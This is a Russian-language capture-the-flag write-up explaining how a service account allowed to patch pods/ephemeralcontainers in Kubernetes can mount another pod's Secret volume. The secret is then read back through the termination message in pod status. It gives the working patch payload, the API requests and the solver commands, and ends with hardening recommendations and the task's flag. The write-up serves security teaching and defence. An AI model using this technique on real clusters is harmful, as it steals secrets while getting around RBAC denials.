# Brainwash, часть 2 — технический разбор

**Флаг:** `avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}`

**Класс:** Kubernetes RBAC abuse / `pods/ephemeralcontainers patch` / Secret volume exfiltration

## Краткое техническое резюме

Начальная позиция — RCE в Aim pod `webapp` и service account token `ci-runner`, полученные в task13.
RBAC запрещает `get secrets`, `pods/exec` и `pods/log`, но разрешает `get/list pods` и namespace-wide
`patch pods/ephemeralcontainers`. Это позволяет добавить ephemeral container в pod `cert-agent`,
повторно смонтировать его Secret volume и записать `/flag.txt` в `/dev/termination-log`. Содержимое
termination message возвращается через разрешённый `pods/get`.

Полная цепочка task13–task15 описана в
[`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md).

## 1. Контекст и цель

Целевой namespace — `brainwash-mlops`. Код выполняется внутри pod `webapp` от service account
`ci-runner`. Kubernetes credentials доступны в стандартном projected volume:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

Kubernetes API endpoint: `https://kubernetes.default.svc`. Цель — прочитать Secret, смонтированный
как `/flag.txt` в pod `cert-agent`, без прямого доступа к Secret API и без `exec`.

## 2. Reconnaissance и attack surface

SelfSubjectAccessReview и прямые API probes показывают следующие effective permissions principal
`ci-runner`:

| Resource | Verb | Результат |
|---|---|---|
| `pods` | `get`, `list` | разрешено |
| `pods/ephemeralcontainers` | `patch` | разрешено |
| `pods/exec` | `create` | запрещено |
| `pods/log` | `get` | запрещено |
| `secrets` | `get`, `list` | запрещено |

`GET /api/v1/namespaces/brainwash-mlops/pods` раскрывает pod specifications и volume definitions.
В `cert-agent` присутствует volume с `secret.secretName`, содержащим `flag`; этот volume доступен
любому container в составе того же pod после соответствующего `volumeMount`.

## 3. Анализ и проверка гипотез

Subresource `pods/ephemeralcontainers` принимает strategic merge patch с полным container spec.
Ephemeral container не может добавить новый volume, но может смонтировать volume, уже объявленный в
pod. Поэтому exploit переиспользует flag Secret volume `cert-agent`.

Поскольку `pods/log` запрещён, stdout не подходит для exfiltration. Kubernetes публикует termination
message в pod status, доступном через `pods/get`. Payload копирует Secret в
`/dev/termination-log`, после чего container завершается.

Admission policy требует restricted security context: non-root UID, запрет privilege escalation,
drop всех Linux capabilities и `RuntimeDefault` seccomp profile.

## 4. Корневая причина

RBAC grant на `pods/ephemeralcontainers patch` недооценён при проектировании роли `ci-runner`.
Право позволяет выполнять attacker-controlled command в любом pod namespace и обращаться ко всем
его volume mounts. Запрет `pods/exec`, `pods/log` и Secret API не ограничивает достигаемый эффект.

Дополнительный exfiltration channel образуется комбинацией `pods/get` и termination messages:
attacker-controlled container переносит данные в `status.ephemeralContainerStatuses`, который
сериализуется обычным pod GET.

## 5. Эксплуатация

Основной patch:

```python
patch = {
    "spec": {
        "ephemeralContainers": [{
            "name": ephemeral_name,
            "image": "registry.internal.brainwash/base:v1",
            "command": [
                "sh",
                "-c",
                "(cat /flag-volume/*; echo) > /dev/termination-log 2>&1",
            ],
            "volumeMounts": [
                {"name": volume, "mountPath": "/flag-volume", "readOnly": True}
            ],
            "terminationMessagePolicy": "File",
            "terminationMessagePath": "/dev/termination-log",
            "securityContext": {
                "allowPrivilegeEscalation": False,
                "capabilities": {"drop": ["ALL"]},
                "runAsNonRoot": True,
                "runAsUser": 10001,
                "seccompProfile": {"type": "RuntimeDefault"},
            },
        }]
    }
}
```

Запросы:

```text
PATCH /api/v1/namespaces/brainwash-mlops/pods/<cert-agent>/ephemeralcontainers
GET   /api/v1/namespaces/brainwash-mlops/pods/<cert-agent>
```

Флаг извлекается из:

```text
status.ephemeralContainerStatuses[].state.terminated.message
```

Solver предназначен для запуска внутри уже скомпрометированного Aim pod:

```bash
python3 /tmp/solve_task14.py
```

Локальная проверка логики:

```bash
uv run python task14/solve_task14.py --self-test
```

## 6. Флаг

```text
avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}
```

## 7. Выводы и рекомендации

- Классифицировать `pods/ephemeralcontainers patch` как privilege уровня `pods/exec`.
- Ограничивать RBAC grants конкретными workload и namespace; не выдавать wildcard scope CI service
  accounts.
- Не размещать privileged credentials и unrelated Secret volumes в pod, доступных для debug
  container injection.
- Контролировать ephemeral containers admission policy и аудитировать обращения к subresource
  `/ephemeralcontainers`.
- Не использовать termination messages для чувствительных данных; учитывать pod status как
  потенциальный data exfiltration channel.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task14/solve_task14.py` — discovery Secret volume, ephemeral-container patch и чтение termination
  message.
- [`../task13/rce_exec.py`](../task13/rce_exec.py) — канал доставки и запуска solver внутри Aim pod.

Анализ initial-access этапа: [`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md).
